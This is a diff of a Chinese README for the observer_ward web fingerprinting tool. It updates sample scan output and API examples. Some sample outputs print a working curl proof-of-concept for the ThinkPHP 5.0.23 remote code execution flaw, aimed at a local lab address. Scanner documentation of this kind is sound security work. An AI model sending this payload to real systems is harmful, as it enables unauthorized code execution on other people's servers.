@@ -101,9 +101,8 @@ brew install observer_ward
 [INFO ] probes loaded: 2223
 [INFO ] optimized probes: 7
 [INFO ] target loaded: 1
-target: http://172.17.0.2/
- |_uri:[ http://172.17.0.2/ [apache-http]  <> (200 OK) ]
- |_uri:[ http://172.17.0.2/ [thinkphp]  <> (200 OK) ]
+|_uri:[ http://172.17.0.2/ [apache-http]  <> (200 OK) ]
+|_uri:[ http://172.17.0.2/ [thinkphp]  <> (200 OK) ]
 ```
 
 - `kaliteam/observer_ward:nuclei`是内置nuclei，在默认配置文件夹有`plugins`目录，但是更新时间不会最新了，是构建docker时的版本
@@ -113,12 +112,11 @@ target: http://172.17.0.2/
 [INFO ] probes loaded: 2223
 [INFO ] optimized probes: 7
 [INFO ] target loaded: 1
-target: http://172.17.0.2/
- |_uri:[ http://172.17.0.2/ [apache-http]  <> (200 OK) ]
- |_uri:[ http://172.17.0.2/ [thinkphp]  <> (200 OK) ]
-  |_exploitable: [Critical] thinkphp-5023-rce: ThinkPHP 5.0.23 - Remote Code Execution
-   |_matched_at: http://172.17.0.2/index.php?s=captcha
-   |_shell: curl -X 'POST' -d '_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1' -H 'Accept: */*' -H 'Accept-Language: en' -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.3.23' 'http://172.17.0.2/index.php?s=captcha'
+|_uri:[ http://172.17.0.2/ [apache-http]  <> (200 OK) ]
+|_uri:[ http://172.17.0.2/ [thinkphp]  <> (200 OK) ]
+ |_exploitable: [Critical] thinkphp-5023-rce: ThinkPHP 5.0.23 - Remote Code Execution
+  |_matched_at: http://172.17.0.2/index.php?s=captcha
+  |_shell: curl -X 'POST' -d '_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1' -H 'Accept: */*' -H 'Accept-Language: en' -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.3.23' 'http://172.17.0.2/index.php?s=captcha'
 ```
 
 <!-- GETTING STARTED -->
@@ -131,8 +129,7 @@ target: http://172.17.0.2/
 [INFO ] 📇probes loaded: 6183
 [INFO ] 🎯target loaded: 1
 [INFO ] 🚀optimized probes: 8
-🏹: http://httpbin.org/
- |_🎯:[ http://httpbin.org/ [0example,swagger]  <httpbin.org> (200 OK) ]
+🎯:[ http://httpbin.org/ [0example,swagger]  <httpbin.org> (200 OK) ]
 ```
 
 - 使用帮助
@@ -275,10 +272,9 @@ Options:
         ),
     }
 [DEBUG] end: http://httpbin.org/
-🏹: http://httpbin.org/
- |_🎯:[ http://httpbin.org/]
- |_🎯:[ http://httpbin.org/ip [httpbin-ip]  <>]
-  |_📰: ip:["1.1.1.1"]
+🎯:[ http://httpbin.org/]
+🎯:[ http://httpbin.org/ip [httpbin-ip]  <>]
+ |_📰: ip:["1.1.1.1"]
 ```
 
 </details>
@@ -294,10 +290,8 @@ Options:
 [INFO ] 📇probes loaded: 6183
 [INFO ] 🎯target loaded: 2
 [INFO ] 🚀optimized probes: 8
-🏹: https://www.example.com/
- |_🎯:[ https://www.example.com/ <Example Domain>  (200 OK) ]
-🏹: http://httpbin.org/
- |_🎯:[ http://httpbin.org/ [0example,swagger]  <httpbin.org> (200 OK) ]
+🎯:[ https://www.example.com/ <Example Domain>  (200 OK) ]
+🎯:[ http://httpbin.org/ [0example,swagger]  <httpbin.org> (200 OK) ]
 ```
 
 - 使用`--list`或者`-l`指定一个目标列表文件
@@ -307,14 +301,11 @@ Options:
 [INFO ] 📇probes loaded: 6183
 [INFO ] 🎯target loaded: 3
 [INFO ] 🚀optimized probes: 8
-🏹: tcp://127.0.0.1:22/
- |_🎯:[ tcp://127.0.0.1:22/ [ssh]  <SSH-2.0-OpenSSH_9.7>]
-  |_📰: version:[9.7] info:[protocol 2.0] 
-🏹: http://172.17.0.2/
- |_🎯:[ http://172.17.0.2/ [apache-http]  <>]
- |_🎯:[ http://172.17.0.2/ [thinkphp]  <>]
-🏹: http://httpbin.org/
- |_🎯:[ http://httpbin.org/ [swagger,0example]  <httpbin.org> (200 OK) ]
+🎯:[ tcp://127.0.0.1:22/ [ssh]  <SSH-2.0-OpenSSH_9.7>]
+ |_📰: version:[9.7] info:[protocol 2.0] 
+🎯:[ http://172.17.0.2/ [apache-http]  <>]
+🎯:[ http://172.17.0.2/ [thinkphp]  <>]
+🎯:[ http://httpbin.org/ [swagger,0example]  <httpbin.org> (200 OK) ]
 ```
 
 - 从标准输入读取目标
@@ -324,9 +315,8 @@ Options:
 [INFO ] 📇probes loaded: 6183
 [INFO ] 🚀optimized probes: 8
 [INFO ] 🎯target loaded: 1
-🏹: http://172.17.0.2/
- |_🎯:[ http://172.17.0.2/ [apache-http]  <>]
- |_🎯:[ http://172.17.0.2/ [thinkphp]  <>]
+🎯:[ http://172.17.0.2/ [apache-http]  <>]
+🎯:[ http://172.17.0.2/ [thinkphp]  <>]
 ```
 
 <p align="right">(<a href="#readme-top">back to top</a>)</p>
@@ -341,8 +331,7 @@ Options:
 [INFO ] 🚀optimized probes: 8
 [INFO ] 🎯target loaded: 1
 ➜  ~ cat output.txt 
-🏹: https://www.example.com/
- |_🎯:[ https://www.example.com/ <Example Domain>  (200 OK) ]
+🎯:[ https://www.example.com/ <Example Domain>  (200 OK) ]
 ```
 
 - 如果是保存到文件输出格式会根据文件后缀自动切换，也可以使用`--format`参数指定输出格式，支持: `txt`,`json`,`csv`
@@ -353,7 +342,7 @@ Options:
 [INFO ] 🚀optimized probes: 8
 [INFO ] 🎯target loaded: 1
 ➜  ~ cat output.json 
-{"target":"https://www.example.com/","matched_result":{"https://www.example.com/":{"title":["Example Domain"],"status":200,"favicon":{},"fingerprints":[],"nuclei-result":{}}}}
+{"https://www.example.com/":{"title":["Example Domain"],"status":200,"favicon":{},"fingerprints":[{"matcher-results":[{"template":"0example","info":{"name":"0example","author":"cn-kali-team","tags":"detect,tech,0example","severity":"info","metadata":{"product":"0example","vendor":"00_unknown","verified":true}},"matcher-name":["<title>example domain</title>"],"extractor":{}}],"matched-at":"https://www.example.com/"}],"nuclei":{}}}
 ```
 
 - 再保存文件的同时也会在终端打印进度信息，如果要想只打印纯结果数据可以使用`--silent`开启静默模式，例如：我只想打印`json`
@@ -403,8 +392,7 @@ Press CTRL+C to quit
 [INFO ] 📇probes loaded: 6183
 [INFO ] 🚀optimized probes: 8
 [INFO ] 🎯target loaded: 1
-🏹: http://httpbin.org/
- |_🎯:[ http://httpbin.org/ [swagger,0example]  <httpbin.org> (200 OK) ]
+🎯:[ http://httpbin.org/ [swagger,0example]  <httpbin.org> (200 OK) ]
 ```
 
 <p align="right">(<a href="#readme-top">back to top</a>)</p>
@@ -429,12 +417,11 @@ Press CTRL+C to quit
 [INFO ] 📇probes loaded: 6183
 [INFO ] 🚀optimized probes: 8
 [INFO ] 🎯target loaded: 1
-🏹: http://172.17.0.2/
- |_🎯:[ http://172.17.0.2/ [apache-http]  <>]
- |_🎯:[ http://172.17.0.2/ [thinkphp]  <>]
-  |_🐞: [Critical] thinkphp-5023-rce: ThinkPHP 5.0.23 - Remote Code Execution
-   |_🔥: http://172.17.0.2/index.php?s=captcha
-   |_🐚: curl -X 'POST' -d '_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1' -H 'Accept: */*' -H 'Accept-Language: en' -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15 Ddg/17.4' 'http://172.17.0.2/index.php?s=captcha'
+🎯:[ http://172.17.0.2/ [apache-http]  <>]
+🎯:[ http://172.17.0.2/ [thinkphp]  <>]
+ |_🐞: [Critical] thinkphp-5023-rce: ThinkPHP 5.0.23 - Remote Code Execution
+  |_🔥: http://172.17.0.2/index.php?s=captcha
+  |_🐚: curl -X 'POST' -d '_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1' -H 'Accept: */*' -H 'Accept-Language: en' -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15 Ddg/17.4' 'http://172.17.0.2/index.php?s=captcha'
 ```
 
 ### 开启Web服务
@@ -456,14 +443,13 @@ Press CTRL+C to quit
 
 - 使用curl请求api，同时设置`Authorization`参数
 
-```bash,no-run
+````bash,no-run
 ➜  ~ curl --request POST \                                                                                                     
   --url http://127.0.0.1:8000/v1/observer_ward \
   --header 'Authorization: Bearer 22e038328151a7a06fd4ebfa63a10228' \
   --header 'Content-Type: application/json' \
   --data '{"target":["https://httpbin.org/"],"or":true,"oc":true}'
-[{"target":"https://httpbin.org/","matched_result":{"https://httpbin.org/":{"title":["httpbin.org"],"status":200,"favicon":{"https://httpbin.org/static/favicon.ico":{"md5":"3aa2067193b2ed83f24c30bd238a717c","mmh3":"-1296740046"}},"fingerprints":[{"matcher-results":[{"template":"swagger","info":{"name":"swagger","author":"cn-kali-team","tags":"detect,tech,swagger","severity":"info","metadata":{"product":"swagger","vendor":"00_unknown","verified":true}},"matcher-name":["swagger-ui.css"],"extractor":{}}],"matched-at":"https://httpbin.org/"},{"matcher-results":[{"template":"0example","info":{"name":"0example","author":"cn-kali-team","tags":"detect,tech,0example","severity":"info","metadata":{"product":"0example","vendor":"00_unknown","verified":true}},"matcher-name":["3aa2067193b2ed83f24c30bd238a717c","https://httpbin.org/static/favicon.ico"],"extractor":{}}],"matched-at":"https://httpbin.org/"}],"nuclei-result":{}}}}]
-```
+[{"https://httpbin.org/":{"title":["httpbin.org"],"status":200,"favicon":{"https://httpbin.org/static/favicon.ico":{"md5":"3aa2067193b2ed83f24c30bd238a717c","mmh3":"-1296740046"}},"fingerprints":[{"matcher-results":[{"template":"swagger","info":{"name":"swagger","author":"cn-kali-team","tags":"detect,tech,swagger","severity":"info","metadata":{"product":"swagger","vendor":"00_unknown","verified":true}},"matcher-name":["swagger-ui.css"],"extractor":{}}],"matched-at":"https://httpbin.org/"}],"nuclei":{}}}]```
 
 - 通过api获取当前config，这些字段都是可以通过每次的POST请求创建识别任务中配置
 
@@ -473,7 +459,7 @@ Press CTRL+C to quit
   --header 'Authorization: Bearer 22e038328151a7a06fd4ebfa63a10228' \
   --header 'Content-Type: application/json'
 {"target":[],"ua":"Mozilla/5.0 (X11; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0","timeout":10,"thread":4,"or":false,"oc":false,"update-fingerprint":false,"update-plugin":false,"webhook":null,"webhook-auth":null}
-```
+````
 
 - 设置`update-plugin`和`update-fingerprint`为`true`更新指纹库和nuclei的插件库
 
